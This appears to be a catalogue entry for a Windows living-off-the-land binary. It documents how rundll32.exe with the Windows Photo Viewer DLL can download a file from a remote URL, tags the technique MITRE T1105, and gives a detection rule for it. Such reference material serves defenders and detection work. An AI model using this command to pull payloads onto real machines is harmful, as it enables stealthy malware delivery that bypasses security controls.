---
id: windows-download-photoviewer
namespace: windows:download:photoviewer
name: photoviewer
description: 'Windows Photo Viewer Located at: C:\Program Files\Windows Photo Viewer\PhotoViewer.dll; C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll.'
author: Avihay Eldad
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- photoviewer
parameters: []
features: []
execution:
  template: photoviewer
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL. (Download file from remote location.)
  command: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
references: []
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: ioc
  description: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing '://') as an argument
install:
- method: choco
  package_name: photoviewer
  commands:
  - choco install photoviewer
---


# photoviewer

photoviewer is a Windows LOLBin. Windows Photo Viewer Located at: C:\Program Files\Windows Photo Viewer\PhotoViewer.dll; C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll.
